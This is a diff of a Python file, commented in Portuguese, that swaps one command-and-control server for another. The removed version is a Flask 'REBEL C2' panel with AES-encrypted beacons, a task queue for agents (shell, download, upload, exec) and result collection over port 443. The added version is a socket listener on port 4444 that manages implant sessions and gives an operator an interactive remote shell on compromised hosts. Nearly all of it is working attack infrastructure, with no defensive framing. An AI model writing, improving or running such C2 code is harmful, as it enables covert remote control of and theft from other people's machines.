@@ -1,167 +1,137 @@
-import sqlite3
-import secrets
-import json
-import base64
+import socket
+import threading
 import time
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-from flask import Flask, request, jsonify, render_template_string
 
-app = Flask(__name__)
+class C2Server:
+    """
+    Servidor de Comando e Controle (C2) para gerenciar múltiplos implantes.
+    Este servidor escuta por conexões, gerencia sessões e permite a interação
+    com cada implante individualmente.
+    """
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.sessions = []
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.shutdown_flag = threading.Event()
 
-# Chave de criptografia global (gerada uma vez, salva em variável de ambiente ou arquivo seguro)
-SECRET_KEY = secrets.token_bytes(32)  # AES-256
+    def listen_for_connections(self):
+        """Inicia o servidor e escuta por conexões de implantes."""
+        self.sock.bind((self.host, self.port))
+        self.sock.listen(5)
+        print(f"[+] Escutando por conexões em {self.host}:{self.port}")
 
-def encrypt(data):
-    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
-    iv = base64.b64encode(cipher.iv).decode('utf-8')
-    ct = base64.b64encode(ct_bytes).decode('utf-8')
-    return json.dumps({'iv': iv, 'ciphertext': ct})
+        while not self.shutdown_flag.is_set():
+            try:
+                conn, addr = self.sock.accept()
+                session = {'conn': conn, 'addr': addr, 'active': True}
+                self.sessions.append(session)
+                print(f"\n[+] Nova conexão recebida de {addr[0]}:{addr[1]}")
+            except socket.error:
+                break
+        print("\n[*] O listener de conexões foi encerrado.")
 
-def decrypt(enc_data):
-    b64 = json.loads(enc_data)
-    iv = base64.b64decode(b64['iv'])
-    ct = base64.b64decode(b64['ciphertext'])
-    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
-    pt = unpad(cipher.decrypt(ct), AES.block_size)
-    return pt.decode('utf-8')
 
-# Inicializar banco de dados
-def init_db():
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS agents (
-        id TEXT PRIMARY KEY,
-        hostname TEXT,
-        ip TEXT,
-        os TEXT,
-        user TEXT,
-        first_seen REAL,
-        last_seen REAL,
-        status TEXT
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS tasks (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        agent_id TEXT,
-        command TEXT,
-        args TEXT,
-        status TEXT,
-        result TEXT,
-        timestamp REAL
-    )''')
-    conn.commit()
-    conn.close()
+    def list_sessions(self):
+        """Lista todas as sessões ativas (implantes conectados)."""
+        print("\n--- Sessões Ativas ---")
+        if not self.sessions:
+            print("Nenhuma sessão ativa encontrada.")
+            return
 
-init_db()
+        for i, session in enumerate(self.sessions):
+            # Verifica se a conexão ainda está viva antes de listar
+            try:
+                session['conn'].send(b'ping')
+                # Pequena espera para ver se ocorre um erro
+                time.sleep(0.1) 
+                print(f"  ID: {i} | Endereço: {session['addr'][0]}:{session['addr'][1]}")
+            except (socket.error, BrokenPipeError):
+                print(f"  ID: {i} | Endereço: {session['addr'][0]}:{session['addr'][1]} (Desconectado)")
+                session['active'] = False
+        
+        # Limpa sessões inativas
+        self.sessions = [s for s in self.sessions if s['active']]
+        print("---------------------\n")
 
-# Interface Web Simples para Operador
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html>
-<head><title>REBEL C2 PANEL</title></head>
-<body>
-<h1>[!] REBEL C2 — Painel de Controle</h1>
-<h3>Agentes Ativos:</h3>
-<ul>
-{% for agent in agents %}
-<li>[{{agent.id}}] {{agent.hostname}} @ {{agent.ip}} ({{agent.os}}) — Último contato: {{agent.last_seen}}</li>
-{% endfor %}
-</ul>
-<hr>
-<h3>Enviar Comando:</h3>
-<form method="POST" action="/task">
-    <input type="text" name="agent_id" placeholder="ID do Agente" required><br><br>
-    <input type="text" name="command" placeholder="Comando (ex: shell, download, upload, exec)" required><br><br>
-    <textarea name="args" placeholder="Argumentos (JSON)"></textarea><br><br>
-    <input type="submit" value="ENVIAR COMANDO REBELDE">
-</form>
-</body>
-</html>
-'''
+    def interact_with_session(self, session_id):
+        """Inicia uma shell interativa com um implante específico."""
+        try:
+            session_id = int(session_id)
+            if 0 <= session_id < len(self.sessions):
+                session = self.sessions[session_id]
+                conn = session['conn']
+                addr = session['addr']
+                print(f"\n[+] Interagindo com a sessão {session_id} ({addr[0]})")
+                print("Digite 'quit' ou 'exit' para retornar ao menu principal.\n")
 
-@app.route('/')
-def panel():
-    conn = sqlite3.connect('c2.db')
-    conn.row_factory = sqlite3.Row
-    c = conn.cursor()
-    c.execute("SELECT * FROM agents WHERE status = 'alive'")
-    agents = c.fetchall()
-    conn.close()
-    return render_template_string(HTML_TEMPLATE, agents=agents)
+                while True:
+                    command = input(f"shell@{addr[0]}> ")
+                    if command.lower() in ['quit', 'exit']:
+                        break
+                    if not command:
+                        continue
 
-@app.route('/beacon', methods=['POST'])
-def beacon():
-    try:
-        encrypted_data = request.json.get('data')
-        decrypted = decrypt(encrypted_data)
-        data = json.loads(decrypted)
+                    try:
+                        conn.send(command.encode('utf-8'))
+                        response = conn.recv(4096).decode('utf-8', errors='ignore')
+                        print(response)
+                    except (socket.error, BrokenPipeError):
+                        print(f"[-] A conexão com a sessão {session_id} foi perdida.")
+                        session['active'] = False
+                        self.sessions = [s for s in self.sessions if s['active']]
+                        break
+            else:
+                print("[-] ID de sessão inválido.")
+        except ValueError:
+            print("[-] ID de sessão inválido. Por favor, insira um número.")
+        except Exception as e:
+            print(f"[-] Ocorreu um erro: {e}")
 
-        agent_id = data.get('id')
-        hostname = data.get('hostname')
-        ip = request.remote_addr
-        os_info = data.get('os')
-        user = data.get('user')
+    def run_console(self):
+        """Executa o console principal do C2 para gerenciamento."""
+        print("\nBem-vindo ao Console do C2.")
+        print("Comandos disponíveis: list, select <ID>, exit")
 
-        conn = sqlite3.connect('c2.db')
-        c = conn.cursor()
+        while not self.shutdown_flag.is_set():
+            cmd_input = input("C2> ").strip().split()
+            if not cmd_input:
+                continue
+            
+            command = cmd_input[0].lower()
 
-        c.execute("SELECT * FROM agents WHERE id = ?", (agent_id,))
-        if c.fetchone():
-            c.execute("UPDATE agents SET last_seen = ?, ip = ?, status = 'alive' WHERE id = ?", (time.time(), ip, agent_id))
-        else:
-            c.execute("INSERT INTO agents (id, hostname, ip, os, user, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'alive')",
-                      (agent_id, hostname, ip, os_info, user, time.time(), time.time()))
+            if command == "list":
+                self.list_sessions()
+            elif command == "select":
+                if len(cmd_input) > 1:
+                    self.interact_with_session(cmd_input[1])
+                else:
+                    print("Uso: select <ID_da_Sessão>")
+            elif command == "exit":
+                print("[*] Encerrando o servidor C2...")
+                self.shutdown_flag.set()
+                for session in self.sessions:
+                    session['conn'].close()
+                self.sock.close()
+                break
+            else:
+                print(f"Comando desconhecido: '{command}'")
 
-        # Buscar tarefas pendentes para este agente
-        c.execute("SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pending'", (agent_id,))
-        tasks = [{'task_id': row[0], 'command': row[1], 'args': row[2]} for row in c.fetchall()]
+    def start(self):
+        """Inicia o servidor e seus componentes."""
+        listener_thread = threading.Thread(target=self.listen_for_connections)
+        listener_thread.daemon = True
+        listener_thread.start()
 
-        # Marcar como "delivered"
-        for task in tasks:
-            c.execute("UPDATE tasks SET status = 'delivered' WHERE id = ?", (task['task_id'],))
+        # Dá um tempo para o listener iniciar antes de mostrar o console
+        time.sleep(0.5) 
+        
+        self.run_console()
+        listener_thread.join() # Espera o thread do listener terminar
 
-        conn.commit()
-        conn.close()
 
-        response = {'tasks': tasks}
-        encrypted_response = encrypt(json.dumps(response))
-        return jsonify({'data': encrypted_response})
-
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/task', methods=['POST'])
-def create_task():
-    agent_id = request.form.get('agent_id')
-    command = request.form.get('command')
-    args = request.form.get('args', '{}')
-
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("INSERT INTO tasks (agent_id, command, args, status, timestamp) VALUES (?, ?, ?, 'pending', ?)",
-              (agent_id, command, args, time.time()))
-    conn.commit()
-    conn.close()
-
-    return f"[!] Comando [{command}] enfileirado para agente {agent_id} — ID da tarefa: {c.lastrowid}"
-
-@app.route('/result', methods=['POST'])
-def result():
-    encrypted_data = request.json.get('data')
-    decrypted = decrypt(encrypted_data)
-    data = json.loads(decrypted)
-
-    task_id = data.get('task_id')
-    result_data = data.get('result')
-
-    conn = sqlite3.connect('c2.db')
-    c = conn.cursor()
-    c.execute("UPDATE tasks SET status = 'completed', result = ? WHERE id = ?", (result_data, task_id))
-    conn.commit()
-    conn.close()
-
-    return jsonify({'status': 'received'})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'), debug=False)
+if __name__ == "__main__":
+    HOST = '0.0.0.0'  # Escuta em todas as interfaces de rede
+    PORT = 4444       # Porta para escutar
+    server = C2Server(HOST, PORT)
+    server.start()
